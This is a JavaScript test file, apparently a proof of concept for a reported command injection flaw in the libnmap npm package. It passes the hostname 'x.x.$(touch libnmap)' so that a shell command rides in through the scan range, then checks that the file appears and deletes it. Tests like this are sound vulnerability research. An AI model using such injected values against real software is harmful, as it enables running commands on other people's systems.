//https://hackerone.com/reports/390865
test("Command Injection in libnmap", () => 
{
    const nmap = require('libnmap');
	const fs = require('fs');
	const path = './libnmap';
	const sleep = require('sleep');
	
	//checking that its not present already
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(false);
    
    const opts = {
        range: [
            'scanme.nmap.org',
            "x.x.$(touch libnmap)"
        ]
    };
    nmap.scan(opts, function(err, report) {
        //if (err) throw new Error(err);
    
        for (let item in report) {
            console.log(JSON.stringify(report[item]));
        }
    });

	sleep.sleep(5);
	//checking that its created by after exploit.
	file_exist = fs.existsSync(path);
	expect(file_exist).toBe(true);

	fs.unlink(path, function(err) {});//deleting the file after creation
});
